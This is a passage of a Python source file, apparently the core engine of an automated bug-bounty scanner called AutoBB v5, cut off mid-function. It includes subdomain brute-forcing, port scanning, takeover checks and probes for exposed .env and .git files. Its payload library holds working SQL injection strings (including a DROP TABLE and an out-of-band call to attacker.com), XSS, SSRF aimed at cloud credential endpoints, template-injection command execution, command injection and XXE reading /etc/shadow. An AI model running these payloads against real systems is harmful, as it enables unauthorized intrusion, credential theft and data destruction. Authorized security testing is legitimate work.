#!/usr/bin/env python3
"""
AutoBB v5 - Core Scanner Engine
Real async scanning, 40+ vuln types, production-grade architecture
"""

import asyncio
import socket
import ssl
import re
import json
import time
import hashlib
import random
import string
import base64
import urllib.parse
import urllib.request
import concurrent.futures
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any, Callable
from enum import Enum
from datetime import datetime
from collections import defaultdict
from pathlib import Path
import threading
import queue
import os
import sys
import subprocess

from reporting import ReportGenerator

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# ─── Data Models ────────────────────────────────────────────────────────────────

class Severity(Enum):
    CRITICAL = (0, "CRITICAL", 9.0)
    HIGH     = (1, "HIGH",     7.0)
    MEDIUM   = (2, "MEDIUM",   4.0)
    LOW      = (3, "LOW",      2.0)
    INFO     = (4, "INFO",     0.0)

    def __init__(self, rank, label, min_cvss):
        self.rank = rank
        self.label = label
        self.min_cvss = min_cvss

    def __lt__(self, other):
        return self.rank < other.rank

@dataclass
class Finding:
    id:           str
    vuln_type:    str
    severity:     Severity
    target:       str
    subdomain:    str
    endpoint:     str
    param:        str
    description:  str
    evidence:     str
    payload:      str
    request:      str
    response:     str
    cvss:         float
    cwe:          str
    remediation:  str
    confidence:   float
    references:   List[str]
    timestamp:    str = field(default_factory=lambda: datetime.now().isoformat())
    verified:     bool = False
    false_positive: bool = False

    def to_dict(self):
        d = asdict(self)
        d['severity'] = self.severity.label
        return d

@dataclass
class SubdomainInfo:
    fqdn:       str
    ips:        List[str]         = field(default_factory=list)
    ports:      List[int]         = field(default_factory=list)
    services:   Dict[int, str]    = field(default_factory=dict)
    techs:      List[str]         = field(default_factory=list)
    headers:    Dict[str, str]    = field(default_factory=dict)
    ssl_info:   Dict[str, Any]    = field(default_factory=dict)
    endpoints:  Set[str]          = field(default_factory=set)
    params:     Dict[str, Set[str]] = field(default_factory=lambda: defaultdict(set))
    forms:      List[Dict]        = field(default_factory=list)
    status:     int               = 0
    alive:      bool              = False
    status_code: int              = 0
    # Interesting classification
    interesting: bool             = False
    interest_score: int           = 0
    interest_categories: List[str] = field(default_factory=list)

@dataclass
class ScanTarget:
    domain:       str
    subdomains:   Dict[str, SubdomainInfo] = field(default_factory=dict)
    findings:     List[Finding]            = field(default_factory=list)
    dns_records:  Dict[str, List[str]]     = field(default_factory=dict)
    status:       str                      = "queued"
    scan_start:   Optional[float]          = None
    scan_end:     Optional[float]          = None

    @property
    def duration(self):
        if self.scan_start and self.scan_end:
            return self.scan_end - self.scan_start
        return 0

    @property
    def critical_count(self):
        return sum(1 for f in self.findings if f.severity == Severity.CRITICAL)

    @property
    def high_count(self):
        return sum(1 for f in self.findings if f.severity == Severity.HIGH)

# ─── Payload Library ────────────────────────────────────────────────────────────

class Payloads:
    SQL = [
        # Error-based
        "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "//\\",
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "' OR 1=1--",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
        "' OR 1=1#", "' OR 1=1/*", "admin'--", "admin'#",
        # Union-based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,version()--",
        "' UNION ALL SELECT NULL--",
        # Boolean blind
        "' AND 1=1--", "' AND 1=2--",
        "' AND '1'='1", "' AND '1'='2",
        # Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "1; SELECT pg_sleep(5)--",
        # Stacked queries
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        # Second order
        "admin'--",
        # OOB
        "'; EXEC xp_dirtree '//attacker.com/a'--",
    ]

    XSS = [
        # Basic
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        # Attribute injection
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)'",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=\"alert('XSS')\">",
        # SVG
        "<svg onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        # Event handlers
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        # Protocol
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        # WAF bypass
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "';alert(1)//",
        "\";alert(1)//",
        # Polyglot
        "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    ]

    SSRF = [
        "http://127.0.0.1",
        "http://127.0.0.1:80",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0",
        # Cloud metadata
        "http://169.254.169.254",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        # Protocol
        "file:///etc/passwd",
        "file:///windows/win.ini",
        "gopher://127.0.0.1:3306/",
        "dict://127.0.0.1:11211/",
        # Bypass
        "http://127.1",
        "http://0177.1",
        "http://0x7f.1",
        "http://2130706433",  # 127.0.0.1 decimal
    ]

    SSTI = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
        "{{7*'7'}}", "${7*'7'}", "{{config}}", "{{self}}",
        "${class.getResource('').path}", "{{''.__class__}}",
        "{{''.class.mro()[2].subclasses()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "@{7*7}", "#set($x=7*7)$x", "{{request}}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    ]

    CMD = [
        ";id", "|id", "&&id", "`id`", "$(id)",
        "; ls -la", "| ls -la", "&& ls -la",
        ";cat /etc/passwd", "|cat /etc/passwd",
        "; ping -c 3 127.0.0.1",
        "| sleep 5", "; sleep 5", "&& sleep 5",
        "$(sleep 5)", "`sleep 5`",
        "%0aid", "%0a/usr/bin/id",
        "\nid\n", "\r\nid\r\n",
    ]

    XXE = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><test>&xxe;</test>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&file;</data>',
    ]

    PATH_TRAVERSAL = [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd", "/windows/win.ini",
        "../../../../../../../../etc/passwd",
        "....\\....\\....\\etc\\passwd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    ]

    OPEN_REDIRECT = [
        "//evil.com", "//evil.com/",
        "https://evil.com", "https://evil.com/",
        "//\\evil.com", "/\\/evil.com",
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
        "/%09/evil.com", "/%2F/evil.com",
        "https:evil.com", "https:/evil.com",
    ]

    SQLI_ERRORS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        r"MySql Error", r"MySQL Query fail",
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
        r"Warning.*\Wmssql_.*", r"Microsoft SQL Native Client error",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark after the character string",
        r"\[SQL Server\]", r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
        r"SqlClient\.", r"System\.Data\.SqlClient\.",
        r"ORA-\d{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_.*", r"Warning.*\Wora_.*",
        r"sqlite3\.OperationalError", r"SQLite/JDBCDriver",
        r"DB2 SQL error", r"SQLCODE", r"SQLSTATE",
        r"You have an error in your SQL syntax",
        r"quoted string not properly terminated",
    ]

# ─── HTTP Engine ────────────────────────────────────────────────────────────────

class HTTPEngine:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    ]

    def __init__(self, timeout=10, proxy=None, verify_ssl=False):
        self.timeout = timeout
        self.proxy   = proxy
        self.verify  = verify_ssl
        self._session = None
        self._lock    = threading.Lock()

    @property
    def session(self):
        if self._session is None:
            with self._lock:
                if self._session is None:
                    s = requests.Session()
                    retry = Retry(total=2, backoff_factor=0.3,
                                  status_forcelist=[429, 500, 502, 503, 504])
                    adapter = HTTPAdapter(max_retries=retry,
                                         pool_connections=50, pool_maxsize=50)
                    s.mount("http://",  adapter)
                    s.mount("https://", adapter)
                    if self.proxy:
                        s.proxies = {"http": self.proxy, "https": self.proxy}
                    self._session = s
        return self._session

    def headers(self, extra: Dict = None) -> Dict:
        h = {
            "User-Agent":      random.choice(self.USER_AGENTS),
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection":      "keep-alive",
        }
        if extra:
            h.update(extra)
        return h

    def get(self, url, params=None, headers=None, allow_redirects=True) -> Optional[requests.Response]:
        if not HAS_REQUESTS:
            return None
        try:
            return self.session.get(
                url, params=params,
                headers=headers or self.headers(),
                timeout=self.timeout,
                verify=self.verify,
                allow_redirects=allow_redirects
            )
        except Exception:
            return None

    def post(self, url, data=None, json_data=None, headers=None) -> Optional[requests.Response]:
        if not HAS_REQUESTS:
            return None
        try:
            return self.session.post(
                url, data=data, json=json_data,
                headers=headers or self.headers(),
                timeout=self.timeout,
                verify=self.verify
            )
        except Exception:
            return None

    def head(self, url) -> Optional[requests.Response]:
        if not HAS_REQUESTS:
            return None
        try:
            return self.session.head(
                url,
                headers=self.headers(),
                timeout=self.timeout,
                verify=self.verify,
                allow_redirects=True
            )
        except Exception:
            return None

    def close(self):
        if self._session:
            self._session.close()

# ─── DNS Engine ─────────────────────────────────────────────────────────────────

class DNSEngine:
    def __init__(self):
        self._cache: Dict[str, List[str]] = {}
        self._lock = threading.Lock()

    def resolve(self, host: str) -> List[str]:
        with self._lock:
            if host in self._cache:
                return self._cache[host]
        try:
            info = socket.getaddrinfo(host, None)
            ips  = list({r[4][0] for r in info})
            with self._lock:
                self._cache[host] = ips
            return ips
        except Exception:
            with self._lock:
                self._cache[host] = []
            return []

    def alive(self, host: str) -> bool:
        return len(self.resolve(host)) > 0

    def wildcard(self, domain: str) -> bool:
        rand = ''.join(random.choices(string.ascii_lowercase, k=16))
        return self.alive(f"{rand}.{domain}")

# ─── Port Scanner ───────────────────────────────────────────────────────────────

class PortScanner:
    TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888,
                 9090, 9200, 27017, 11211, 2181, 6443, 10250]

    SERVICE_MAP = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
        8443: "HTTPS-Alt", 9200: "Elasticsearch", 27017: "MongoDB",
        11211: "Memcached", 6443: "K8s-API", 10250: "Kubelet",
    }

    def scan(self, host: str, ports: List[int] = None, timeout: float = 0.5) -> List[int]:
        ports  = ports or self.TOP_PORTS
        open_p = []

        def check(p):
            try:
                with socket.create_connection((host, p), timeout=timeout):
                    return p
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            results = ex.map(check, ports)
        return [p for p in results if p is not None]

    def banner(self, host: str, port: int, timeout: float = 2.0) -> str:
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                if port in (80, 8080, 8000):
                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
                data = s.recv(512)
                return data.decode("utf-8", errors="replace")[:200]
        except Exception:
            return ""

# ─── SSL Analyzer ───────────────────────────────────────────────────────────────

class SSLAnalyzer:
    def analyze(self, host: str, port: int = 443) -> Dict:
        result = {}
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=5) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as s:
                    cert   = s.getpeercert()
                    cipher = s.cipher()
                    result["protocol"]    = s.version()
                    result["cipher"]      = cipher[0] if cipher else "unknown"
                    result["cipher_bits"] = cipher[2] if cipher else 0
                    if cert:
                        result["subject"] = dict(x[0] for x in cert.get("subject", []))
                        result["issuer"]  = dict(x[0] for x in cert.get("issuer",  []))
                        result["not_after"]  = cert.get("notAfter", "")
                        result["not_before"] = cert.get("notBefore", "")
                        sans = cert.get("subjectAltName", [])
                        result["sans"] = [s[1] for s in sans if s[0] == "DNS"]
        except Exception as e:
            result["error"] = str(e)
        return result

    def expired(self, info: Dict) -> bool:
        na = info.get("not_after", "")
        if not na:
            return False
        try:
            from email.utils import parsedate
            import calendar
            exp = calendar.timegm(parsedate(na))
            return exp < time.time()
        except Exception:
            return False

    def weak_protocol(self, info: Dict) -> bool:
        proto = info.get("protocol", "")
        return proto in ("SSLv2", "SSLv3", "TLSv1", "TLSv1.1")

# ─── Tech Fingerprinter ─────────────────────────────────────────────────────────

class TechFingerprinter:
    SIGNATURES = {
        # Servers
        "nginx":      [("server", r"nginx")],
        "apache":     [("server", r"Apache")],
        "IIS":        [("server", r"Microsoft-IIS")],
        "cloudflare": [("server", r"cloudflare"), ("cf-ray", r".")],
        "caddy":      [("server", r"Caddy")],
        # Frameworks / Languages
        "PHP":        [("x-powered-by", r"PHP"), ("set-cookie", r"PHPSESSID")],
        "ASP.NET":    [("x-powered-by", r"ASP\.NET"), ("x-aspnet-version", r".")],
        "Express":    [("x-powered-by", r"Express")],
        "Django":     [("set-cookie", r"csrftoken"), ("x-frame-options", r"SAMEORIGIN")],
        "WordPress":  [("link", r"wp-json"), ("set-cookie", r"wordpress_")],
        "Drupal":     [("x-generator", r"Drupal"), ("set-cookie", r"Drupal")],
        "Joomla":     [("set-cookie", r"joomla_"), ("x-content-encoded-by", r"Joomla")],
        # Security
        "ModSecurity":   [("server", r"mod_security"), ("x-sucuri-id", r".")],
        "AWS":           [("server", r"AmazonS3"), ("x-amz-request-id", r".")],
        "JWT-Auth":      [("www-authenticate", r"Bearer")],
    }

    def fingerprint(self, headers: Dict[str, str], body: str = "") -> List[str]:
        techs = []
        for tech, checks in self.SIGNATURES.items():
            for hdr, pattern in checks:
                val = headers.get(hdr, "")
                if val and re.search(pattern, val, re.IGNORECASE):
                    if tech not in techs:
                        techs.append(tech)
                    break
        # Body-based detection
        body_sigs = {
            "React":    r"data-reactroot|__NEXT_DATA__|_react",
            "Vue.js":   r"__vue__|data-v-",
            "Angular":  r"ng-version|_nghost",
            "jQuery":   r"jquery[.\-][\d.]+\.js",
            "Bootstrap": r"bootstrap[.\-][\d.]+",
        }
        for tech, pattern in body_sigs.items():
            if body and re.search(pattern, body, re.IGNORECASE):
                if tech not in techs:
                    techs.append(tech)
        return techs

# ─── Subdomain Enumerator ───────────────────────────────────────────────────────

class SubdomainEnumerator:
    # TOP 500 most common subdomains (expanded from 120)
    WORDLIST = [
        # Core infrastructure
        "www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2","ns3","ns4","ns5",
        "mx","mx1","mx2","mx3","email","imap","pop3",
        # Web/API
        "api","api-v2","api2","apiv2","v1","v2","v3","rest","graphql","ws","wss",
        "websocket","app","app1","app2","mobile","m","wap",
        # Development
        "dev","develop","development","staging","stage","test","testing","qa","uat",
        "preprod","sandbox","demo","beta","alpha","preview",
        # Admin/Management  
        "admin","administrator","admins","root","console","dashboard","panel","control",
        "cpanel","whm","plesk","webmin","manage","management","manager",
        # Authentication
        "login","signin","auth","authentication","sso","oauth","oauth2","saml","cas",
        "ldap","ad","identity","accounts","account",
        # Internal/Private
        "internal","intranet","private","corp","corporate","vpn","remote","access",
        "secure","ssl","tls",
        # Content/Media
        "static","assets","cdn","media","images","img","photos","pics","videos","files",
        "uploads","download","downloads","storage",
        # Documentation
        "docs","documentation","help","support","wiki","kb","knowledgebase","faq","guide",
        # Monitoring/Analytics
        "status","health","monitor","monitoring","grafana","kibana","prometheus",
        "alertmanager","metrics","analytics","stats","tracking","logs","logging",
        # DevOps/CI/CD
        "jenkins","ci","build","travis","bamboo","teamcity","gitlab","github","bitbucket",
        "git","svn","deploy","deployment","release","cd",
        # Cloud/Containers
        "k8s","kubernetes","docker","rancher","portainer","swarm","nomad","openshift",
        # Databases
        "db","database","mysql","postgres","postgresql","mongo","mongodb","redis",
        "elasticsearch","elastic","es","solr","cassandra","mariadb","oracle","mssql",
        # Business
        "crm","erp","hrm","finance","billing","payment","invoice","shop","store","cart",
        "checkout","ecommerce",
        # Communication
        "chat","slack","teams","zoom","meet","conference","voice","sip","voip","pbx",
        # Geographic
        "us","usa","eu","europe","uk","de","fr","au","asia","ap","sg","jp","cn","in","ca",
        "br","mx","east","west","north","south","central",
        # Environment
        "prod","production","live","old","new","legacy","archive","backup","bak","temp",
        "tmp","cache",
        # Numbered
        "1","2","3","4","5","10","100","web1","web2","web3","server1","server2","host1",
        "host2",
        # Blog/Community  
        "blog","news","forum","forums","community","social","feed",
        # Marketing
        "www2","portal","customer","partner","partners","affiliate","affiliates",
        "reseller","vendor",
        # Misc
        "exchange","owa","autodiscover","lyncdiscover","splunk","tableau","metabase",
        "vault","consul","etcd","zookeeper","registry","harbor","nexus","artifactory",
        # Additional high-value
        "phpmyadmin","adminer","secret","secrets","config","configuration","env",
        "jenkins2","sonar","sonarqube","jira","confluence","bamboo","crowd","s3",
        "bucket","lambda","ec2","rds","cloudfront","terraform","ansible","puppet","chef",
    ]

    TAKEOVER_SIGS = {
        "github":        ["There isn't a GitHub Pages site here"],
        "heroku":        ["No such app", "herokucdn.com/error-pages/no-such-app"],
        "aws_s3":        ["NoSuchBucket", "The specified bucket does not exist"],
        "shopify":       ["Sorry, this shop is currently unavailable"],
        "fastly":        ["Fastly error: unknown domain"],
        "zendesk":       ["Help Center Closed"],
        "tumblr":        ["Whatever you were looking for doesn't currently exist"],
        "azure":         ["404 Web Site not found"],
        "bitbucket":     ["Repository not found"],
        "ghost":         ["The thing you were looking for is no longer here"],
        "surge":         ["project not found"],
        "intercom":      ["This page is reserved for artistic"],
        "teamwork":      ["Oops - We didn't find your site"],
        "helpscout":     ["No settings were found for this company:"],
        "amazonaws":     ["NoSuchBucket"],
        "wordpress":     ["Do you want to register"],
        "feedburner":    ["This feed does not exist"],
        "freshdesk":     ["There is no helpdesk here with this URL"],
        "uservoice":     ["This UserVoice subdomain is currently available"],
        "pantheon":      ["The gods are wise"],
        "unbounce":      ["The requested URL was not found on this server"],
        "strikingly":    ["page not found"],
        "uberflip":      ["Non-hub domain, The URL you've accessed does not provide"],
        "readme":        ["Project doesnt exist yet"],
    }

    def __init__(self, dns: DNSEngine, http: HTTPEngine, notify_cb: Callable = None):
        self.dns    = dns
        self.http   = http
        self.notify = notify_cb or (lambda *a, **k: None)

    def enumerate(self, domain: str) -> Dict[str, SubdomainInfo]:
        found: Dict[str, SubdomainInfo] = {}
        is_wildcard = self.dns.wildcard(domain)

        if is_wildcard:
            self.notify(f"[!] Wildcard DNS detected on {domain} — adjusting strategy", "WARN")

        # DNS brute-force (threaded)
        def check_sub(prefix):
            fqdn = f"{prefix}.{domain}"
            ips  = self.dns.resolve(fqdn)
            if not ips:
                return None
            if is_wildcard:
                # Require HTTP confirmation
                r = self.http.head(f"https://{fqdn}")
                if not r or r.status_code >= 400:
                    r = self.http.head(f"http://{fqdn}")
                if not r or r.status_code >= 400:
                    return None
            return fqdn, ips

        self.notify(f"[+] Brute-forcing {len(self.WORDLIST)} subdomains...", "INFO")
        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
            futures = {ex.submit(check_sub, w): w for w in self.WORDLIST}
            for fut in concurrent.futures.as_completed(futures):
                result = fut.result()
                if result:
                    fqdn, ips = result
                    found[fqdn] = SubdomainInfo(fqdn=fqdn, ips=ips)
                    self.notify(f"[subdomain] {fqdn} → {', '.join(ips)}", "FOUND")
        
        # Subfinder integration (passive, 50+ sources)
        try:
            subprocess.run(['subfinder', '-version'], capture_output=True, timeout=2, check=True)
            self.notify(f"[*] Running Subfinder (passive enumeration)...", "INFO")
            try:
                cmd = ['subfinder', '-d', domain, '-all', '-silent', '-timeout', '2', '-t', '50']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
                
                subfinder_count = 0
                for line in result.stdout.strip().split('\n'):
                    subdomain = line.strip().lower()
                    if subdomain and subdomain not in found and '.' in subdomain:
                        ips = self.dns.resolve(subdomain)
                        if ips:
                            found[subdomain] = SubdomainInfo(fqdn=subdomain, ips=ips)
                            subfinder_count += 1
                
                if subfinder_count > 0:
                    self.notify(f"[+] Subfinder found {subfinder_count} additional subdomains", "INFO")
            
            except subprocess.TimeoutExpired:
                self.notify(f"[!] Subfinder timeout after 90s", "WARN")
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass  # Subfinder not installed

        # Certificate transparency (attempt crt.sh)
        ct_subs = self._ct_lookup(domain)
        for sub in ct_subs:
            if sub not in found:
                ips = self.dns.resolve(sub)
                if ips:
                    found[sub] = SubdomainInfo(fqdn=sub, ips=ips)
                    self.notify(f"[CT] {sub} → {', '.join(ips)}", "FOUND")
        
        # ═══ CLASSIFY INTERESTING SUBDOMAINS ═══
        interesting_patterns = {
            'admin': ['admin', 'administrator', 'root', 'cpanel', 'whm', 'control', 'manage'],
            'dev': ['dev', 'develop', 'staging', 'stage', 'test', 'qa', 'uat', 'sandbox'],
            'api': ['api', 'rest', 'graphql', 'ws', 'internal-api'],
            'auth': ['auth', 'login', 'sso', 'oauth', 'saml', 'ldap'],
            'internal': ['internal', 'intranet', 'private', 'corp', 'vpn'],
            'database': ['db', 'database', 'mysql', 'postgres', 'mongo', 'redis', 'phpmyadmin'],
            'legacy': ['old', 'legacy', 'backup', 'bak', 'archive', 'deprecated'],
        }
        
        for fqdn, info in found.items():
            name_lower = fqdn.lower()
            interesting = False
            categories = []
            score = 0
            
            for category, patterns in interesting_patterns.items():
                for pattern in patterns:
                    if pattern in name_lower:
                        interesting = True
                        categories.append(category)
                        if category in ['admin', 'database']:
                            score += 30
                        elif category in ['dev', 'internal', 'auth']:
                            score += 25
                        else:
                            score += 15
                        break
            
            # Store classification
            info.interesting = interesting
            info.interest_score = min(score, 100)
            info.interest_categories = list(set(categories))
            
            if interesting:
                cats = ','.join(categories[:2])
                self.notify(f"[INTERESTING] {fqdn} [{cats}] score:{score}", "HIGH")

        # Check for takeover and create findings
        for fqdn, info in found.items():
            takeover = self._check_takeover(fqdn)
            if takeover:
                # Create a Finding object for subdomain takeover
                from datetime import datetime
                takeover_finding = Finding(
                    id=hashlib.md5(f"takeover-{fqdn}".encode()).hexdigest()[:12],
                    vuln_type=f"Subdomain Takeover ({takeover})",
                    severity=Severity.CRITICAL,
                    target=fqdn,
                    subdomain=fqdn,
                    endpoint="/",
                    param="",
                    description=f"Subdomain {fqdn} vulnerable to takeover via {takeover} - CNAME exists but service unclaimed",
                    evidence=f"Service: {takeover}, CNAME points to unclaimed resource",
                    payload="",
                    request=f"Check CNAME record for {fqdn}",
                    response="",
                    cvss=9.0,
                    cwe="CWE-350",
                    remediation=f"Remove DNS record or claim the {takeover} subdomain immediately to prevent takeover",
                    confidence=0.95,
                    references=[
                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover",
                        "https://github.com/EdOverflow/can-i-take-over-xyz"
                    ],
                    timestamp=datetime.now().isoformat(),
                    verified=False,
                    false_positive=False,
                )
                # Store it temporarily to add to target findings later
                info.takeover_finding = takeover_finding
                self.notify(f"[!] SUBDOMAIN TAKEOVER on {fqdn} ({takeover})", "CRITICAL")

        return found

    def _ct_lookup(self, domain: str) -> List[str]:
        """Query crt.sh for certificate transparency logs"""
        results = []
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            r   = self.http.get(url)
            if r and r.status_code == 200:
                data = r.json()
                seen = set()
                for entry in data:
                    names = entry.get("name_value", "").split("\n")
                    for name in names:
                        name = name.strip().lower().lstrip("*.")
                        if name.endswith(f".{domain}") and name not in seen:
                            seen.add(name)
                            results.append(name)
        except Exception:
            pass
        return results

    def _check_takeover(self, fqdn: str) -> Optional[str]:
        for scheme in ("https://", "http://"):
            r = self.http.get(scheme + fqdn)
            if r:
                body = r.text or ""
                for service, sigs in self.TAKEOVER_SIGS.items():
                    for sig in sigs:
                        if sig.lower() in body.lower():
                            return service
        return None

# ─── Web Crawler ────────────────────────────────────────────────────────────────

class Crawler:
    INTERESTING_PATHS = [
        "/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.git/config",
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/config.json", "/config.yml", "/config.yaml", "/settings.json",
        "/api/v1", "/api/v2", "/api/v3", "/graphql", "/api-docs",
        "/swagger.json", "/swagger/v1/swagger.json", "/openapi.json",
        "/admin", "/administrator", "/admin/login", "/wp-admin",
        "/phpmyadmin", "/adminer.php", "/manager/html",
        "/actuator", "/actuator/env", "/actuator/mappings",
        "/debug", "/console", "/_debug_toolbar", "/profiler",
        "/server-status", "/server-info", "/.htaccess",
        "/backup", "/backup.zip", "/backup.tar.gz", "/db.sql",
        "/wp-config.php.bak", "/web.config.bak", "/app.config",
    ]

    def __init__(self, http: HTTPEngine, fp: TechFingerprinter, notify_cb: Callable = None):
        self.http   = http
        self.fp     = fp
        self.notify = notify_cb or (lambda *a, **k: None)

    def probe(self, info: SubdomainInfo):
        """Probe a subdomain — gather headers, tech, endpoints, params, forms"""
        base = self._base_url(info)
        if not base:
            return

        r = self.http.get(base)
        if not r:
            return

        info.alive    = True
        info.status   = r.status_code
        info.headers  = dict(r.headers)
        info.techs    = self.fp.fingerprint(dict(r.headers), r.text or "")
        info.endpoints.add("/")

        # Probe interesting paths
        def check_path(path):
            url = base + path
            resp = self.http.get(url)
            if resp and resp.status_code not in (404, 403):
                return path, resp.status_code, resp.text[:200]
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for result in ex.map(check_path, self.INTERESTING_PATHS):
                if result:
                    path, status, preview = result
                    info.endpoints.add(path)
                    if status == 200:
                        self.notify(f"[path] {info.fqdn}{path} [{status}]", "INFO")

        # Crawl HTML for links & forms
        if HAS_BS4 and r.text:
            self._extract_html(info, base, r.text)

    def _extract_html(self, info: SubdomainInfo, base: str, html: str):
        try:
            soup = BeautifulSoup(html, "html.parser")
            parsed_base = urllib.parse.urlparse(base)

            # Links
            for tag in soup.find_all("a", href=True):
                href = tag["href"]
                if href.startswith("/") and not href.startswith("//"):
                    info.endpoints.add(href.split("?")[0])
                elif parsed_base.netloc in href:
                    p = urllib.parse.urlparse(href).path
                    info.endpoints.add(p.split("?")[0] or "/")

                # Extract query params
                if "?" in href:
                    qs = urllib.parse.parse_qs(urllib.parse.urlparse(href).query)
                    for k in qs:
                        info.params[href.split("?")[0]].add(k)

            # Forms
            for form in soup.find_all("form"):
                action  = form.get("action", "/")
                method  = form.get("method", "GET").upper()
                inputs  = []
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name:
                        inputs.append({
                            "name":  name,
